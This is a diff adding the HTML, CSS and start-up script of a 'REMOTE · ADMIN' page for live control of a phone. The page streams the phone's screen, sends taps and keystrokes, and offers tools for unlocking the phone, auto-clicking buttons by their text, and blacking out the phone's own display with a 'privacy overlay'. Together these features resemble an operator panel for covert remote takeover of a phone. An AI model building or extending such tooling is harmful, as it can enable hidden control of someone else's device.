@@ -1,0 +1,1832 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>REMOTE · ADMIN</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=JetBrains+Mono:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html {
+  --g: 0,255,65;
+  --red: #00ff41;
+  --red-bright: #4dff7a;
+  --red-soft: #99ffb3;
+  --red-deep: #008a23;
+  --red-dim: rgba(var(--g), 0.10);
+  --red-dim2: rgba(var(--g), 0.20);
+  --red-glow: rgba(var(--g), 0.45);
+  --red-glow-soft: rgba(var(--g), 0.18);
+  --border-faint: rgba(var(--g), 0.07);
+  --border-dim: rgba(var(--g), 0.17);
+  --border-mid: rgba(var(--g), 0.34);
+  --bg-void: #000;
+  --txt-1: #d9ffe5;
+  --txt-2: rgba(200,255,220,0.55);
+  --txt-3: rgba(200,255,220,0.26);
+}
+html.theme-red {
+  --g: 255,0,51; --red:#ff0033; --red-bright:#ff3b5c; --red-soft:#ff7d92; --red-deep:#a3001f;
+  --txt-1:#ffe9ed; --txt-2: rgba(255,233,237,0.55); --txt-3: rgba(255,233,237,0.26);
+}
+html.theme-blue {
+  --g: 0,212,255; --red:#00d4ff; --red-bright:#4de5ff; --red-soft:#99ebff; --red-deep:#0077a3;
+  --txt-1:#d9f3ff; --txt-2: rgba(200,235,255,0.55); --txt-3: rgba(200,235,255,0.26);
+}
+html.theme-pureblue {
+  --g: 0,0,255; --red:#0000ff; --red-bright:#4d4dff; --red-soft:#9999ff; --red-deep:#0000a3;
+  --txt-1:#e0e0ff; --txt-2: rgba(200,200,255,0.55); --txt-3: rgba(200,200,255,0.26);
+}
+html.theme-yellow {
+  --g: 255,204,0; --red:#ffcc00; --red-bright:#ffdd44; --red-soft:#ffe680; --red-deep:#a38000;
+  --txt-1:#fff7d9; --txt-2: rgba(255,245,200,0.55); --txt-3: rgba(255,245,200,0.26);
+}
+
+html, body {
+  font-family: 'JetBrains Mono', monospace;
+  background: var(--bg-void);
+  color: var(--txt-1);
+  height: 100vh;
+  height: 100dvh;
+  overflow: hidden;
+  -webkit-font-smoothing: antialiased;
+  -webkit-tap-highlight-color: transparent;
+  transition: color 0.35s;
+}
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  pointer-events: none; z-index: 9998;
+  background: repeating-linear-gradient(0deg,
+    rgba(var(--g),0.022) 0px, rgba(var(--g),0.022) 1px, transparent 1px, transparent 3px);
+  opacity: 0.5;
+}
+
+/* ── Header ── */
+#hd {
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  height: 46px;
+  background: rgba(0,0,0,0.78);
+  backdrop-filter: blur(8px);
+  border-bottom: 1px solid var(--border-dim);
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 12px;
+  z-index: 30;
+  gap: 8px;
+}
+#hd::after {
+  content: '';
+  position: absolute; bottom: -1px; left: 0; right: 0; height: 1px;
+  background: linear-gradient(90deg, transparent, var(--red) 20%, var(--red-bright) 50%, var(--red) 80%, transparent);
+  box-shadow: 0 0 12px var(--red-glow);
+  opacity: 0.85;
+}
+.hd-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
+.hd-right { display: flex; align-items: center; gap: 6px; flex-shrink: 0; }
+
+#hd-back {
+  background: transparent;
+  border: 1px solid var(--border-dim);
+  color: var(--txt-3);
+  padding: 5px 9px;
+  border-radius: 4px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; font-weight: 700;
+  letter-spacing: 0.14em;
+  cursor: pointer;
+  text-transform: uppercase;
+  flex-shrink: 0;
+}
+#hd-back:hover { border-color: var(--red); color: var(--red-bright); background: var(--red-dim); }
+#hd-device {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12px;
+  letter-spacing: 0.14em;
+  color: var(--red-bright);
+  text-shadow: 0 0 8px var(--red-glow-soft);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+#hd-device .id { color: var(--txt-3); font-size: 10px; margin-left: 6px; letter-spacing: 0.08em; }
+
+.hd-badge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 9.5px;
+  font-weight: 700;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  padding: 5px 9px;
+  border-radius: 4px;
+  background: var(--red-dim);
+  color: var(--red);
+  border: 1px solid var(--border-mid);
+  box-shadow: inset 0 0 8px var(--red-dim);
+  white-space: nowrap;
+}
+
+.hd-btn {
+  background: rgba(10,12,10,0.9);
+  border: 1px solid var(--border-dim);
+  border-radius: 4px;
+  padding: 6px 10px;
+  color: var(--txt-2);
+  font-size: 10px; font-weight: 700;
+  font-family: 'JetBrains Mono', monospace;
+  cursor: pointer;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  transition: all 0.15s;
+  white-space: nowrap;
+}
+.hd-btn:hover { border-color: var(--red); color: var(--red-bright); background: var(--red-dim); }
+.hd-btn.danger { color: #ff6666; border-color: rgba(255,60,60,0.25); }
+.hd-btn.danger:hover { color: #fff; border-color: #ff4444; background: rgba(255,60,60,0.2); }
+.hd-btn.active { background: var(--red); color: #000; border-color: var(--red); box-shadow: 0 0 14px var(--red-glow); }
+
+/* ── Stream area ── */
+#stream-wrap {
+  position: fixed;
+  top: 46px;
+  left: 0; right: 0;
+  bottom: calc(56px + env(safe-area-inset-bottom, 0px));
+  background: #000;
+  overflow: hidden;
+  cursor: crosshair;
+  touch-action: none;   /* 🎯 critical: prevents browser gestures stealing our touches */
+  user-select: none;
+  -webkit-user-select: none;
+}
+#v-canvas, #v-video, #v-snapshot {
+  position: absolute;
+  pointer-events: none;
+  user-select: none;
+  -webkit-user-select: none;
+}
+#v-canvas { display: none; }
+#v-video { display: none; object-fit: contain; }
+#v-snapshot { display: none; object-fit: contain; }
+#v-snapshot.show { display: block; }
+
+/* Wireframe canvas — same slot as snapshot */
+#v-wire {
+  position: absolute;
+  display: none;
+  background: #000;
+  z-index: 3;
+}
+#v-wire.show { display: block; }
+
+/* ─── Wireframe hover tooltip ───────────────────────────────── */
+#wire-tooltip {
+  position: absolute;
+  pointer-events: none;
+  background: rgba(0,0,0,0.96);
+  border: 1px solid #4a90ff;
+  border-radius: 5px;
+  padding: 10px 14px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  color: #fff;
+  max-width: 340px;
+  min-width: 120px;
+  word-break: break-word;
+  line-height: 1.45;
+  z-index: 12;
+  display: none;
+  box-shadow: 0 6px 24px rgba(0,0,0,0.85), 0 0 16px rgba(74,144,255,0.45);
+  white-space: pre-wrap;
+}
+#wire-tooltip.show { display: block; }
+#wire-tooltip .tt-text {
+  color: #fff;
+  font-weight: 600;
+  margin-bottom: 5px;
+  letter-spacing: 0.02em;
+}
+#wire-tooltip .tt-meta {
+  color: #6a9fdf;
+  font-size: 10px;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+}
+#wire-tooltip .tt-flags {
+  margin-top: 6px;
+  display: flex;
+  gap: 5px;
+  flex-wrap: wrap;
+}
+#wire-tooltip .tt-flag {
+  font-size: 9px;
+  padding: 2px 6px;
+  border-radius: 2px;
+  background: rgba(61,220,132,0.2);
+  color: #3ddc84;
+  border: 1px solid rgba(61,220,132,0.4);
+  font-weight: 700;
+  letter-spacing: 0.1em;
+}
+#wire-tooltip .tt-flag.blue {
+  background: rgba(74,144,255,0.2);
+  color: #4a90ff;
+  border-color: rgba(74,144,255,0.4);
+}
+#wire-tooltip .tt-flag.red {
+  background: rgba(255,60,60,0.2);
+  color: #ff5555;
+  border-color: rgba(255,60,60,0.4);
+}
+#wire-tooltip .tt-flag.yellow {
+  background: rgba(255,180,0,0.2);
+  color: #ffb400;
+  border-color: rgba(255,180,0,0.4);
+}
+
+/* SNAP button — visible only when live */
+#tb-snap {
+  background: rgba(168,85,247,0.15);
+  border-color: rgba(168,85,247,0.45);
+  color: #a855f7;
+}
+#tb-snap:hover { background: rgba(168,85,247,0.28); border-color: #a855f7; }
+
+/* REFRESH button — visible only when frozen, orange */
+#tb-snap-refresh {
+  display: none;
+  background: rgba(255,180,0,0.18);
+  border-color: rgba(255,180,0,0.55);
+  color: #ffb400;
+  font-weight: 800;
+}
+#tb-snap-refresh:hover { background: rgba(255,180,0,0.32); border-color: #ffb400; }
+#tb-snap-refresh.show { display: flex; }
+
+/* LIVE button — visible only when frozen, green */
+#tb-live {
+  display: none;
+  background: rgba(61,220,132,0.18);
+  border-color: rgba(61,220,132,0.5);
+  color: #3ddc84;
+  font-weight: 800;
+}
+#tb-live:hover { background: rgba(61,220,132,0.32); border-color: #3ddc84; }
+#tb-live.show { display: flex; }
+
+/* Auto-click panel */
+#ac-hint {
+  font-size: 10px;
+  color: var(--txt-3);
+  letter-spacing: 0.06em;
+  line-height: 1.6;
+  text-transform: uppercase;
+  margin-bottom: 6px;
+}
+#ac-hint code {
+  color: #4a90ff;
+  font-weight: 700;
+  background: rgba(74,144,255,0.12);
+  padding: 1px 4px;
+  border-radius: 3px;
+  font-size: 10px;
+  letter-spacing: 0.04em;
+}
+#ac-input {
+  background: rgba(7,9,7,0.92);
+  border: 1px solid var(--border-dim);
+  border-radius: 5px;
+  padding: 13px 14px;
+  color: var(--txt-1);
+  font-size: 15px;
+  font-family: 'JetBrains Mono', monospace;
+  outline: none;
+  width: 100%;
+  text-align: center;
+  letter-spacing: 0.06em;
+  font-weight: 700;
+}
+#ac-input:focus { border-color: var(--red); box-shadow: 0 0 14px var(--red-glow-soft); }
+#ac-input::placeholder {
+  color: var(--txt-3);
+  font-size: 11px;
+  font-weight: 400;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+}
+.ac-result {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10.5px;
+  color: var(--txt-2);
+  background: rgba(2,5,3,0.9);
+  border: 1px solid var(--border-faint);
+  border-radius: 5px;
+  padding: 10px 12px;
+  min-height: 42px;
+  line-height: 1.6;
+  word-break: break-word;
+  margin-top: 4px;
+  white-space: pre-wrap;
+}
+.ac-result.success {
+  color: #3ddc84;
+  border-color: rgba(61,220,132,0.35);
+  background: rgba(61,220,132,0.08);
+}
+.ac-result.fail {
+  color: #ff6666;
+  border-color: rgba(255,60,60,0.35);
+  background: rgba(255,60,60,0.08);
+}
+
+/* HINTS toggle — shows wireframe tooltips on hover */
+#tb-hints {
+  display: none;
+  background: rgba(255,255,255,0.05);
+  border-color: var(--border-dim);
+  color: var(--txt-3);
+}
+#tb-hints:hover { border-color: var(--border-mid); color: var(--txt-2); }
+#tb-hints.show { display: flex; }
+#tb-hints.on {
+  background: rgba(74,144,255,0.18);
+  border-color: rgba(74,144,255,0.5);
+  color: #4a90ff;
+  box-shadow: 0 0 12px rgba(74,144,255,0.4);
+}
+
+/* AUTO refresh toggle */
+#tb-auto {
+  display: none;
+  background: rgba(255,255,255,0.05);
+  border-color: var(--border-dim);
+  color: var(--txt-3);
+}
+#tb-auto:hover { border-color: var(--border-mid); color: var(--txt-2); }
+#tb-auto.show { display: flex; }
+#tb-auto.on {
+  background: rgba(61,220,132,0.18);
+  border-color: rgba(61,220,132,0.5);
+  color: #3ddc84;
+}
+
+/* Frozen state — orange border glow around the stream area */
+#stream-wrap.frozen {
+  box-shadow: inset 0 0 0 3px #ffb400, inset 0 0 40px rgba(255,180,0,0.18);
+  transition: box-shadow 0.2s ease-out;
+}
+
+/* Big prominent snapshot badge */
+#snapshot-badge {
+  position: absolute;
+  top: 14px; right: 14px;
+  background: #ffb400;
+  color: #000;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  font-weight: 800;
+  padding: 8px 16px;
+  border-radius: 5px;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  display: none;
+  z-index: 8;
+  box-shadow: 0 0 18px rgba(255,180,0,0.7), 0 4px 12px rgba(0,0,0,0.5);
+  pointer-events: none;
+  animation: badgePulse 2s ease-in-out infinite;
+}
+#snapshot-badge.show { display: block; }
+
+@keyframes badgePulse {
+  0%, 100% { box-shadow: 0 0 18px rgba(255,180,0,0.7), 0 4px 12px rgba(0,0,0,0.5); }
+  50%      { box-shadow: 0 0 26px rgba(255,180,0,0.9), 0 4px 12px rgba(0,0,0,0.5); }
+}
+
+/* ── Toolbar ── */
+#tb {
+  position: fixed;
+  bottom: 0; left: 0; right: 0;
+  height: calc(56px + env(safe-area-inset-bottom, 0px));
+  padding: 0 12px env(safe-area-inset-bottom, 0px);
+  background: #050805;
+  border-top: 1px solid var(--border-dim);
+  display: flex; align-items: center;
+  gap: 8px;
+  z-index: 30;
+  overflow-x: auto;
+  overflow-y: hidden;
+  scrollbar-width: none;
+  -webkit-overflow-scrolling: touch;
+}
+#tb::-webkit-scrollbar { display: none; }
+#tb::before {
+  content: '';
+  position: absolute; top: -1px; left: 0; right: 0; height: 1px;
+  background: linear-gradient(90deg, transparent, var(--red) 20%, var(--red-bright) 50%, var(--red) 80%, transparent);
+  box-shadow: 0 0 10px var(--red-glow);
+  opacity: 0.7;
+}
+.tb-group { display: flex; gap: 4px; flex-shrink: 0; }
+.tb-spacer { flex: 1; min-width: 0; }
+.tb-btn {
+  background: #0c100c;
+  border: 1px solid var(--border-dim);
+  border-radius: 4px;
+  padding: 8px 11px;
+  color: var(--txt-2);
+  font-size: 10px; font-weight: 700;
+  font-family: 'JetBrains Mono', monospace;
+  cursor: pointer;
+  display: flex; align-items: center;
+  gap: 5px;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  transition: all 0.15s;
+  white-space: nowrap;
+  flex-shrink: 0;
+  user-select: none;
+  -webkit-user-select: none;
+  -webkit-tap-highlight-color: transparent;
+}
+.tb-btn:active { background: var(--red-dim2); border-color: var(--red); color: var(--red-bright); }
+.tb-btn svg { width: 13px; height: 13px; flex-shrink: 0; }
+.tb-btn.purple {
+  background: var(--red-dim);
+  border-color: var(--border-mid);
+  color: var(--red-soft);
+}
+.tb-btn.privacy-on {
+  background: var(--red);
+  border-color: var(--red);
+  color: #000;
+  box-shadow: 0 0 14px var(--red-glow);
+}
+
+/* ── Side panels (slide from right) ── */
+.side-panel {
+  position: fixed;
+  top: 46px;
+  right: 0;
+  bottom: calc(56px + env(safe-area-inset-bottom, 0px));
+  width: 340px;
+  max-width: 88vw;
+  z-index: 40;
+  transform: translateX(100%);
+  transition: transform 0.26s cubic-bezier(0.4, 0, 0.2, 1);
+  pointer-events: none;
+}
+.side-panel.show {
+  transform: translateX(0);
+  pointer-events: all;
+}
+.side-panel-inner {
+  background: rgba(5,6,5,0.96);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border-left: 1px solid var(--red);
+  height: 100%;
+  padding: 20px 16px;
+  display: flex; flex-direction: column;
+  gap: 10px;
+  overflow-y: auto;
+  box-shadow: -14px 0 50px rgba(0,0,0,0.85), -1px 0 24px var(--red-glow-soft);
+}
+.side-panel h3 {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 13px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--txt-1);
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border-faint);
+  margin-bottom: 4px;
+}
+.side-panel input[type="text"] {
+  background: rgba(7,9,7,0.92);
+  border: 1px solid var(--border-dim);
+  border-radius: 5px;
+  padding: 11px 13px;
+  color: var(--txt-1);
+  font-size: 13px;
+  font-family: 'JetBrains Mono', monospace;
+  outline: none;
+  width: 100%;
+}
+.side-panel input[type="text"]:focus { border-color: var(--red); box-shadow: 0 0 14px var(--red-glow-soft); }
+
+.panel-actions { display: flex; gap: 8px; justify-content: flex-end; margin-top: 4px; }
+.tool-row {
+  display: flex; gap: 8px;
+}
+.tool-row .tool-btn { flex: 1; }
+.tool-btn {
+  background: var(--red-dim);
+  border: 1px solid var(--border-mid);
+  border-radius: 5px;
+  padding: 12px 14px;
+  color: var(--red-soft);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10.5px; font-weight: 700;
+  cursor: pointer;
+  text-align: left;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  transition: all 0.15s;
+  user-select: none;
+  -webkit-user-select: none;
+}
+.tool-btn:active { background: var(--red-dim2); color: var(--red-bright); border-color: var(--red); }
+.tool-btn.danger { color: #ff6666; border-color: rgba(255,60,60,0.3); }
+.tool-result {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10.5px;
+  color: var(--txt-2);
+  background: rgba(2,5,3,0.9);
+  border: 1px solid var(--border-faint);
+  border-radius: 5px;
+  padding: 10px 12px;
+  min-height: 40px;
+  line-height: 1.6;
+  word-break: break-all;
+  margin-top: 4px;
+}
+
+/* ─── Privacy panel ────────────────────────────────────────────── */
+#privacy-text-input {
+  background: rgba(7,9,7,0.92);
+  border: 1px solid var(--border-dim);
+  border-radius: 5px;
+  padding: 13px 14px;
+  color: var(--txt-1);
+  font-size: 17px;
+  font-family: 'JetBrains Mono', monospace;
+  outline: none;
+  width: 100%;
+  text-align: center;
+  letter-spacing: 0.08em;
+  font-weight: 700;
+}
+#privacy-text-input:focus { border-color: var(--red); box-shadow: 0 0 14px var(--red-glow-soft); }
+#privacy-text-input::placeholder {
+  color: var(--txt-3);
+  font-size: 11px;
+  font-weight: 400;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+}
+#privacy-char-count {
+  text-align: right;
+  font-size: 10px;
+  color: var(--txt-3);
+  letter-spacing: 0.1em;
+  margin-top: -4px;
+}
+#privacy-char-count.warn { color: #ff8c00; }
+#panel-privacy .panel-actions button { flex: 1; justify-content: center; }
+#privacy-deactivate { width: 100%; justify-content: center; margin-top: 4px; }
+
+/* Backdrop for side panels on mobile */
+#panel-backdrop {
+  position: fixed;
+  inset: 0;
+  top: 46px;
+  bottom: calc(56px + env(safe-area-inset-bottom, 0px));
+  background: rgba(0,0,0,0.5);
+  z-index: 35;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.26s;
+}
+#panel-backdrop.show { opacity: 1; pointer-events: all; }
+
+/* ── Stats overlay ── */
+#stats {
+  position: fixed;
+  top: 56px; left: 14px;
+  z-index: 5;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  line-height: 1.55;
+  color: var(--red);
+  white-space: pre;
+  pointer-events: none;
+  text-shadow:
+    0 0 6px var(--red-glow),
+    0 0 14px var(--red-glow-soft),
+    1px 1px 2px rgba(0,0,0,0.9),
+    -1px -1px 2px rgba(0,0,0,0.9);
+  display: none;
+}
+#stats.show { display: block; }
+
+/* ── Connecting overlay ── */
+#conn {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.94);
+  backdrop-filter: blur(14px);
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  gap: 16px;
+  z-index: 200;
+  padding: 20px;
+  text-align: center;
+}
+#conn.hidden { display: none; }
+.spinner {
+  width: 54px; height: 54px;
+  border-radius: 50%;
+  border: 2px solid var(--red-dim);
+  border-top-color: var(--red);
+  border-right-color: var(--red-bright);
+  animation: spin 0.75s linear infinite;
+  box-shadow: 0 0 26px var(--red-glow-soft);
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+#conn-status {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 16px; letter-spacing: 0.22em; text-transform: uppercase;
+  color: var(--red);
+  text-shadow: 0 0 12px var(--red-glow);
+}
+#conn-sub { font-size: 10.5px; color: var(--txt-3); letter-spacing: 0.14em; text-transform: uppercase; }
+#conn-cancel {
+  background: var(--red-dim);
+  border: 1px solid var(--border-mid);
+  color: var(--red-bright);
+  border-radius: 5px;
+  padding: 10px 24px;
+  font-size: 10.5px; font-weight: 700;
+  font-family: 'JetBrains Mono', monospace;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  cursor: pointer;
+  margin-top: 8px;
+}
+#conn-cancel:hover { background: var(--red-dim2); border-color: var(--red); }
+
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: #050805; }
+::-webkit-scrollbar-thumb { background: var(--red-deep); }
+
+/* ── Mobile ── */
+@media (max-width: 700px) {
+  #hd { height: 42px; padding: 0 8px; gap: 6px; }
+  #hd-back { padding: 5px 7px; font-size: 9px; }
+  #hd-device { font-size: 10px; }
+  #hd-device .id { display: none; }
+  .hd-badge { font-size: 8.5px; padding: 4px 7px; }
+  .hd-btn { padding: 5px 8px; font-size: 9px; letter-spacing: 0.08em; }
+  #stream-wrap { top: 42px; bottom: calc(52px + env(safe-area-inset-bottom, 0px)); }
+  #tb { height: calc(52px + env(safe-area-inset-bottom, 0px)); padding: 0 8px env(safe-area-inset-bottom, 0px); gap: 6px; }
+  .tb-btn { padding: 7px 9px; font-size: 9px; gap: 4px; }
+  .tb-btn svg { width: 12px; height: 12px; }
+  .side-panel { top: 42px; bottom: calc(52px + env(safe-area-inset-bottom, 0px)); width: 100%; max-width: 100%; }
+  .side-panel-inner { padding: 16px 12px; border-left: none; }
+  #stats { top: 50px; left: 8px; font-size: 10px; }
+  #panel-backdrop { top: 42px; bottom: calc(52px + env(safe-area-inset-bottom, 0px)); }
+}
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div id="hd">
+  <div class="hd-left">
+    <button id="hd-back" title="Back to admin">← Admin</button>
+    <div id="hd-device">Loading…<span class="id"></span></div>
+  </div>
+  <div class="hd-right">
+    <div class="hd-badge" id="hd-mode">WEBRTC</div>
+    <button class="hd-btn" id="hd-stats" title="Toggle stats">Stats</button>
+    <button class="hd-btn danger" id="hd-close" title="End session">End</button>
+  </div>
+</div>
+
+<!-- Stream -->
+<div id="stream-wrap">
+  <canvas id="v-canvas"></canvas>
+  <video id="v-video" autoplay playsinline muted></video>
+  <img id="v-snapshot" alt=""/>
+  <canvas id="v-wire"></canvas>
+  <div id="snapshot-badge">SNAPSHOT</div>
+  <div id="wire-tooltip"></div>
+</div>
+<pre id="stats"></pre>
+
+<!-- Toolbar -->
+<div id="tb">
+  <div class="tb-group">
+    <button class="tb-btn purple" id="tb-type">
+      <svg viewBox="0 0 24 24" fill="none"><rect x="2" y="6" width="20" height="13" rx="2" stroke="currentColor" stroke-width="1.8"/><path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h.01M10 14h.01M14 14h.01M18 14h.01" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+      Type
+    </button>
+    <button class="tb-btn purple" id="tb-privacy">
+      <svg viewBox="0 0 24 24" fill="none"><rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor" stroke-width="1.8"/><path d="M7 11V7a5 5 0 0110 0v4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+      Privacy
+    </button>
+    <button class="tb-btn purple" id="tb-son">☀</button>
+    <button class="tb-btn purple" id="tb-soff">☾</button>
+    <button class="tb-btn" id="tb-snap" title="Render current screen">📷 RENDER</button>
+    <button class="tb-btn" id="tb-snap-refresh" title="Refresh render">🔄 REFRESH</button>
+    <button class="tb-btn" id="tb-hints" title="Show label tooltips on hover">💬 HINTS</button>
+    <button class="tb-btn" id="tb-auto" title="Auto-refresh after every action">⚡ AUTO</button>
+    <button class="tb-btn" id="tb-live" title="Return to live stream">▶ LIVE</button>
+    <button class="tb-btn" id="tb-auto-click" title="Click a button by its text">
+      🖱 CLICK
+    </button>
+    <button class="tb-btn purple" id="tb-tools">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M14.7 6.3a1 1 0 000 1.4l1.6 1.6a1 1 0 001.4 0l3.77-3.77a6 6 0 01-7.94 7.94l-6.91 6.91a2.12 2.12 0 01-3-3l6.91-6.91a6 6 0 017.94-7.94l-3.77 3.77z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Tools
+    </button>
+  </div>
+  <div class="tb-spacer"></div>
+  <div class="tb-group">
+    <button class="tb-btn" id="tb-back">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Back
+    </button>
+    <button class="tb-btn" id="tb-home">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M3 12L12 3l9 9M5 10v11h14V10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Home
+    </button>
+    <button class="tb-btn" id="tb-recents">
+      <svg viewBox="0 0 24 24" fill="none"><rect x="4" y="4" width="6" height="7" rx="1" stroke="currentColor" stroke-width="1.8"/><rect x="14" y="4" width="6" height="7" rx="1" stroke="currentColor" stroke-width="1.8"/><rect x="4" y="14" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.8"/><rect x="14" y="14" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.8"/></svg>
+      Recents
+    </button>
+  </div>
+</div>
+
+<!-- Keyboard side panel -->
+<div class="side-panel" id="panel-kb">
+  <div class="side-panel-inner">
+    <h3>⌨ Type on Device</h3>
+    <input id="kb-input" type="text" placeholder="Type and press Enter…" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
+    <div class="panel-actions">
+      <button class="tb-btn" id="kb-cancel">Cancel</button>
+      <button class="tb-btn purple" id="kb-send">Send</button>
+    </div>
+  </div>
+</div>
+
+<!-- Tools side panel -->
+<div class="side-panel" id="panel-tools">
+  <div class="side-panel-inner">
+    <h3>⚙ Device Tools</h3>
+    <button class="tool-btn" id="tool-unlock">🔓 Unlock Phone</button>
+    <button class="tool-btn" id="tool-verify">✓ Confirm / Verify</button>
+    <div class="tool-row">
+      <button class="tool-btn" id="tool-learn">◐ Start Learning</button>
+      <button class="tool-btn danger" id="tool-stoplearn">■ Stop &amp; Save</button>
+    </div>
+    <div class="tool-result" id="tools-result">—</div>
+    <div class="panel-actions">
+      <button class="tb-btn" id="tools-close">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Auto-click side panel -->
+<div class="side-panel" id="panel-auto-click">
+  <div class="side-panel-inner">
+    <h3>Universal Auto-Click</h3>
+    <div id="ac-hint">
+      Type the exact text of the button you want to click.<br>
+      Use <code>Text[2]</code> for the 2nd match if there are duplicates.
+    </div>
+    <input
+      id="ac-input"
+      type="text"
+      maxlength="60"
+      placeholder="e.g. Cancel"
+      autocomplete="off"
+    />
+    <div class="panel-actions">
+      <button class="tb-btn" id="ac-cancel">Cancel</button>
+      <button class="tb-btn purple" id="ac-send">Send</button>
+    </div>
+    <div id="ac-result" class="ac-result">—</div>
+  </div>
+</div>
+
+<!-- Privacy side panel -->
+<div class="side-panel" id="panel-privacy">
+  <div class="side-panel-inner">
+    <h3>Privacy Overlay</h3>
+    <input
+      id="privacy-text-input"
+      type="text"
+      maxlength="30"
+      placeholder="Optional message"
+      autocomplete="off"
+    />
+    <div id="privacy-char-count">0 / 30</div>
+    <div class="panel-actions">
+      <button class="tb-btn" id="privacy-cancel">Cancel</button>
+      <button class="tb-btn" id="privacy-black">Black</button>
+      <button class="tb-btn purple" id="privacy-activate">Send</button>
+    </div>
+    <button class="tb-btn danger" id="privacy-deactivate">Stop Overlay</button>
+  </div>
+</div>
+
+<!-- Backdrop for side panels -->
+<div id="panel-backdrop"></div>
+
+<!-- Connecting overlay -->
+<div id="conn">
+  <div class="spinner"></div>
+  <div id="conn-status">Connecting…</div>
+  <div id="conn-sub">Please wait</div>
+  <button id="conn-cancel">Cancel</button>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════
+//  BOOT
+// ═══════════════════════════════════════════════════════════════════════
+const params = new URLSearchParams(location.search);
+const DEVICE_ID = (params.get('device') || '').toUpperCase();
+const MODE_PARAM = (params.get('mode') || 'webrtc').toLowerCase();
+const SERVER_URL = `wss://${location.host}`;
+
+// Theme — shared with admin
+const THEMES = ['green','red','blue','pureblue','yellow'];
+const currentTheme = localStorage.getItem('admin_theme') || 'green';
+if (THEMES.includes(currentTheme) && currentTheme !== 'green') {
+  document.documentElement.classList.add('theme-' + currentTheme);
+}
+
+// Chosen mode from URL (immutable this session — switch via admin panel)
+let chosenMode = ['webrtc','screenshot','accessibility'].includes(MODE_PARAM) ? MODE_PARAM : 'webrtc';
+let currentMode = chosenMode;
+
+if (!DEVICE_ID) {
+  document.getElementById('conn-status').textContent = 'No device specified';
+  document.getElementById('conn-sub').textContent = 'Missing ?device= parameter';
+} else {
+  document.getElementById('hd-device').innerHTML =
+    `Remote<span class="id">${DEVICE_ID}</span>`;
+  document.getElementById('hd-mode').textContent = chosenMode.toUpperCase();
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  STATE
+// ═══════════════════════════════════════════════════════════════════════
+let ws = null;
+let pc = null;
+let isConnected = false;
+let hostWidth = 540, hostHeight = 1200;
+let pointerDown = false;
+let pointerStartX = 0, pointerStartY = 0;
+let longPressTimer = null, longPressTriggered = false;
+let dragActive = false, lastMoveSent = 0;
+const DRAG_THRESHOLD = 8, MOVE_INTERVAL_MS = 25;
+let privacyActive = false;
+
+// Compatibility hook: this build has no additional privacy amplification routine.
+function applyPrivacyAmplify(active) {
+  // Intentionally empty.
+}
+let statsOn = false;
+let statsTimer = null;
+let ctrlRtt = null;
+let lastBytes = 0, lastTs = 0;
+const ss = { bytes:0, recv:0, drawn:0, full:0, tiles:0 };
+let ssPrev = null;
+
+// Snapshot state
+let snapshotMode = false;
+let snapshotPending = false;
+let snapshotAt = 0;
+let snapshotTimer = null;
+let autoRefreshOn = false;
+let autoRefreshTimer = null;
+
+const TILE_SIZE = 128;
